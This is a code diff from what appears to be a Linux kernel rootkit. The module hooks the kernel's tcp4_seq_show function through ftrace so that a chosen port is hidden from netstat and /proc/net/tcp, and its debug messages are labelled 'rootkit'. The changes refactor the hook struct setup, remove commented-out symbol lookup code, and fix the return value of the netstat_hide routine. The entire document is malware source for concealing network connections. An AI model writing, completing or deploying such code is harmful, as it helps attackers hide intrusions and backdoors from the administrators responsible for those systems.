@@ -15,12 +15,7 @@
 #include <linux/tcp.h>
 #define PORT_HIDE 0x1f90
 #define USE_FENTRY_OFFSET 0
-#define HOOK(_name, _hook, _orig)   \
-{                   \
-    .name = (_name),        \
-    .function = (_hook),        \
-    .original = (_orig),        \
-}
+
 static asmlinkage long (*org_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
@@ -45,7 +40,11 @@ struct ftrace_hook {
 	struct ftrace_ops ops;
 };
 
-struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);
+struct ftrace_hook tcp4_hook = {
+    .name = "tcp4_seq_show",
+    .function = hook_tcp4_seq_show,
+    .original = &org_tcp4_seq_show
+};
 
 static void notrace register_callback_hook(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
 {
@@ -83,8 +82,7 @@ static int netstat_install_hook(struct ftrace_hook *f_hook)
     int ret;
     //fill the structs
     //we asume that his name and hook func already configired
-    //f_hook->addr = kallsyms_lookup_name(f_hook->name);
-   // *((unsigned long *)org_tcp4_seq_show) = f_hook->addr;
+    
     ret = fh_resolve_hook_address(f_hook);
     if (ret)
         return ret;
@@ -106,33 +104,17 @@ void fh_remove_hook(struct ftrace_hook *hook)
 		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
 	}
 
-	//err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
 	if(err)
 	{
 		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
 	}
 }
-/*
-static int netstat_hide(void)
-{
-    int ret;
-    ret = install_hook(&tcp4_hook);
-    //ret = set_ops("/proc/net/tcp");
-    printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
-
-    return 0;
-}
-static void netstat_unhide(void)
-{
-    fh_remove_hook(&tcp4_hook);
-} */   
 
 
 static int netstat_hide(void)
 {
     int ret;
     ret = netstat_install_hook(&tcp4_hook);
-    //ret = set_ops("/proc/net/tcp");
     printk(KERN_ALERT "set ops done, ret equals to : %d", ret);
 
     return ret;
